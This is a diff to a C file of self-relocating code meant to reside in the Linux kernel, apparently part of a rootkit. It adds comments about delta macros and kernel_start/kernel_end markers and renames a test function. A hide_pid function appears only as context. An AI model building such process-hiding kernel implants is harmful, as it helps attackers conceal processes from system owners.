@@ -21,7 +21,7 @@
 /*
  * Only this is what will get resident in the Linux Kernel.
  *
- * IMPORTANT: If you will be hacking this, DO NOT USE static/global variables (local/auto is ok), because they will not get relocated. Use the self-relocating macros, that calculates delta.
+ * IMPORTANT: If you will be hacking this, USE DELTA MACROS for non-local variables, and do not hardcode strings nor arrays (declare them global with delta macros), because they will not get relocated. 
  *
  */
 
@@ -32,6 +32,9 @@
 "\t.size\t"#name", .-"#name"\n" \
 );
 
+/*
+ * Delta macros.
+ */
 #define DSTR(name, str) asm( \
 "\t.globl\t"#name"\n" \
 "\t.type\t"#name", @function\n" \
@@ -73,6 +76,9 @@
 
 #define DPTR(name) D8(name)
 
+/*
+ * Our Kernel begins here.
+ */
 LABEL(kernel_start)
 
 #include <linux/slab.h>
@@ -136,7 +142,7 @@ extern const char *MSG_PID_NF(void);
 extern const char *MSG_PID_NH(void);
 extern const char *MSG_KM_ERR(void);
 
-void kernel_test(void) {
+void pid_list_test(void) {
 	size_t i;
 
     /*
@@ -162,6 +168,10 @@ void kernel_test(void) {
 	}
 
 	pid_list_destroy();
+}
+
+void kernel_test(void) {
+	//pid_list_test();
 }
 
 int hide_pid(pid_t nr) {
@@ -363,3 +373,8 @@ DPTR(pid_list_head)
 DPTR(pid_list_tail)
 
 LABEL(kernel_end)
+/*
+ * Kernel ends here.
+ *
+ * IMPORTANT: DON'T add code below here. It won't get copied nor accesible.
+ */
